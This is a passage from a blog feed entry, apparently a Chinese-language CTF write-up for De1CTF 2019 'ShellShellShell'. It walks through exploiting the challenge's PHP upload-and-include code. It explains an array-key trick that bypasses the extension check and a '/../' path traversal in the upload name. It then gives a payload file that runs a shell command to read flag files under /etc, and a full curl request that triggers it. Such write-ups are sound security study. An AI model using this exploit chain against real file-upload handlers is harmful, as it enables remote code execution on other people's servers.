<span class="string">&#x27;/var/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;prefix&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$filename</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$ext</span>==<span class="variable">$filename</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$filename</span>) - <span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;try again!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$new_name</span> = (<span class="keyword">string</span>)<span class="title function_ invoke__">rand</span>(<span class="number">100</span>,<span class="number">999</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$new_name</span>);</span><br><span class="line">    <span class="variable">$_</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(@<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$_</span>)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&#x27;@&lt;?php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$_</span>,<span class="variable">$new_name</span>)===<span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$_</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can do it!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$new_name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先判断<code>$ext==$filename[count($filename) - 1]</code></p><p>如果传入file&#x3D;a.php，$filename将变为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ext=php，$filename[count($filename) - 1]=$filename[1]=php</span><br></pre></td></tr></table></figure><p>如果post传入数组，先传入file[1]&#x3D;a，再传入file[0]&#x3D;php，$filename将变为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>end($fileename)即$ext仍为php，但是$filename[1]&#x3D;a,即可绕过$ext&#x3D;&#x3D;$filename[count($filename)-1]判断（本质因为是键值对数组）</p><p>然后是文件上传改名，可以通过目录穿越绕过，当$ext&#x3D;&#x2F;..&#x2F;a.php时（即$file[0]&#x3D;&#x2F;..&#x2F;a.php）,$new_name&#x3D;123.&#x2F;..&#x2F;a.php,即上传文件到当前目录，文件名为a.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$new_name</span> = (<span class="keyword">string</span>)<span class="title function_ invoke__">rand</span>(<span class="number">100</span>,<span class="number">999</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$new_name</span></span><br></pre></td></tr></table></figure><p>最后是对要包含的文件的文件内容和文件名进行校验，标签前加@并不影响执行（无视），因为上一步绕过文件上传，将a.php上传到当前目录，所以传入hello&#x3D;a.php，并不等于$new_name。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(@<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$_</span>)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&#x27;@&lt;?php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$_</span>,<span class="variable">$new_name</span>)===<span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$_</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can do it!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在之前admin的文件上传页面上传a.php，内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="meta">&lt;?php</span> <span class="keyword">echo</span> `find /etc -name *flag* -exec cat &#123;&#125; +`;</span><br></pre></td></tr></table></figure><p>利用Postman生成curl命令，实际使用时删除postman生成的file参数中a.php的前缀</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182148674.png" alt="image-20250318214849558" loading="lazy"></p><p>在蚁剑终端执行curl命令发送post请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://10.244.80.225&#x27;</span> --form <span class="string">&#x27;file=@&quot;a.php&quot;&#x27;</span> --form <span class="string">&#x27;hello=&quot;a.php&quot;&#x27;</span> --form <span class="string">&#x27;file[1]=&quot;111&quot;&#x27;</span> --form <span class="string">&#x27;file[2]=&quot;222&quot;&#x27;</span> --form <span class="string">&#x27;file[0]=&quot;/../a.php&quot;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182149871.png" alt="image-20250318214915735" loading="lazy"></p><p>参考</p><p><a href="https://www.cnblogs.com/CabbageJun/p/15953184.html">https://www.cnblogs.com/CabbageJun/p/15953184.html</a></p><p><a href="https://blog.csdn.net/qq_43756333/article/details/107386403">https://blog.csdn.net/qq_43756333/article/details/107386403</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;De1CTF-2019-ShellShellShell&quot;&gt;&lt;a href=&quot;#De1CTF-2019-ShellShellShell&quot; class=&quot;headerlink&quot; title=&quot;[De1CTF 2019]ShellShellShell&quot;&gt;&lt;/a&gt;[De1</summary>
      
    
    
    
    <category term="刷题笔记" scheme="https://kinseyy.github.io/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
